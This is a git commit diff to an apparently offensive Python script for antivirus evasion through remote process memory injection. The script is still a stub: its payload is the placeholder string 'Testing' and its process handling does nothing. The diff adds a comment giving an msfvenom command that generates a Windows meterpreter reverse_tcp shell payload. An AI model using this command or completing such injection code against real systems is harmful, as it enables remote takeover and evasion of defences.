6293d8f6d07e616939120a6827743b6d21e98e7e
zeugirdoR sixelA <44281620+binexisHATT@users.noreply.github.com>
2021-01-02 14:29:45 -0500

    Update inject.py

--- AntivirusEvasion/RemoteProcessMemInjection/inject.py
+++ AntivirusEvasion/RemoteProcessMemInjection/inject.py
@@ -4,13 +4,14 @@ from argparse import ArgumentParser
 if __name__ == "__main__":
    parser = ArgumentParser() 
    parser.add_argument("-id", "--by-id", default=False, help="process will be identified by pid instead of name")
-   parser.add_argument("proc", help="the target process")
+   parser.add_argument("PROC", help="the target process")
 
    args = parser.parse_args()
    
-   with Process(args.proc, args.by_id) as proc:
-      pass
-   
+   # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f py
    payload = bytearray(
-    "Testing"
+      "Testing"
    )
+   
+   with Process(args.PROC, args.by_id) as ps_handle:
+      pass
